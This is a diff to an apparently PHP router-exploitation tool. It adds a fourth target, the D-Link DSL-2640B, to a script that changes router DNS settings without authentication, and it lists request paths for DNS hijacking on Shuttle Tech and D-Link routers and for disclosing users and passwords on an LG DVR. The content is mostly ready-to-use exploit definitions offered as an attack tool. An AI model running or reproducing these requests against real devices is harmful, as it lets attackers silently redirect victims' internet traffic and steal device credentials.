@@ -18,7 +18,7 @@ TOOL - Unauthenticated Remote DNS change/ users & passwords.
 
 - Description:
 ------
-  The script explores three vulnerabilities in routers
+  The script explores four vulnerabilities in routers
  * 01 - Shuttle Tech ADSL Modem-Router 915 WM / Unauthenticated Remote DNS Change Exploit
 
   reference: http://www.exploit-db.com/exploits/35995/
@@ -30,6 +30,10 @@ TOOL - Unauthenticated Remote DNS change/ users & passwords.
  * 03 - LG DVR LE6016D / Unauthenticated users/passwords disclosure exploitit
 
   reference: http://www.exploit-db.com/exploits/36014/
+  
+ * 04 - D-Link DSL-2640B Unauthenticated Remote DNS Change Exploitx
+  
+  reference: http://1337day.com/exploit/23302/ 
 
 - Execute:
 ------
@@ -64,8 +68,9 @@ $params['exploit_model']['model_002'] = '/file001php.php';
 $params['exploit_model']['model_003'] = '/file001.html';
 
 #DEFINITION OF EXPLOITS
-line 92: $params['exploit_model']['Shuttle_Tech_ADSL_Modem_Router_915_WM'] = "/dnscfg.cgi?dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1";
-line 93: $params['exploit_model']['D_Link_DSL_2740R'] = "/dns_1?Enable_DNSFollowing=1&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}";
-line 94: $params['exploit_model']['LG_DVR_LE6016D'] = "/dvr/wwwroot/user.cgi";
+LINE 99 $params['exploit_model']['Shuttle_Tech_ADSL_Modem_Router_915_WM'] = "/dnscfg.cgi?dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1";
+LINE 100 $params['exploit_model']['D_Link_DSL_2740R'] = "/dns_1?Enable_DNSFollowing=1&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}";
+LINE 101 $params['exploit_model']['D_Link_DSL_2640B'] = "/ddnsmngr.cmd?action=apply&service=0&enbl=0&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP";
+LINE 102 $params['exploit_model']['LG_DVR_LE6016D'] = "/dvr/wwwroot/user.cgi";
 
 ```
